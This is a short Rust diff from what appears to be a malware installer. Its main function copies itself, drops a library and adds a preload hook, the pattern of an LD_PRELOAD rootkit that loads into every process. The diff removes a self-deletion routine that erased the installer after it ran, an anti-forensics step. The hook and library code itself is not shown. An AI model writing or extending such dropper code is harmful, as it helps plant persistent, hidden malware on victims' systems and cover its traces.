@@ -8,7 +8,6 @@ pub fn main() {
     copy_self();
     let lib_path = drop_library();
     add_preload_hook(lib_path);
-    delete_self();
     info!("✅ Installation process completed.");
 }
 
@@ -95,14 +94,4 @@ fn find_library_path() -> PathBuf {
     }
     warn!("⚠️ Failed to find library path, defaulting to /lib");
     PathBuf::from("/lib")
-}
-
-fn delete_self() {
-    let current_exe = env::current_exe().unwrap();
-    info!("🗑️  Deleting current executable: {}", current_exe.display());
-    if fs::remove_file(current_exe).is_err() {
-        error!("⚠️ Failed to delete current executable.");
-    } else {
-        info!("✅ Executable deleted successfully.");
-    }
 }
